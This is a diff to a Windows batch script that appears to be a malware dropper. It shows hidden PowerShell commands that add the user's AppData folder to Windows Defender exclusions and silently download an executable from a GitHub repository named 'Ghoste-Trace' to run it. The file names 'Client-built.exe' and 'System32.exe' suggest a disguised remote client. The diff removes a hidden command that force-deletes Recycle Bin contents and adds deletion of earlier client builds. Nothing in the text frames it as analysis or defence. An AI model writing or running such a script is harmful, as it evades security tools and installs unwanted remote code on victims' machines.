@@ -7,9 +7,6 @@ if exist "%SUBDIR%" (
 )
 mkdir "%SUBDIR%"
 
-:: Empty Recycle Bin
-powershell -WindowStyle Hidden -Command "$shell = New-Object -ComObject Shell.Application; $shell.Namespace(0xA).Items() | %% { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }"
-
 :: Check internet
 ping -n 1 8.8.8.8 >nul 2>&1
 if errorlevel 1 (
@@ -31,6 +28,10 @@ set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/m
 
 :: Defender Exclusion
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+
+:: Delete any existing client-builds just in case
+del /f /q "%SUBDIR%\Client-built.exe" >nul 2>&1
+del /f /q "%SUBDIR%\System32.exe" >nul 2>&1
 
 :: Download and run
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
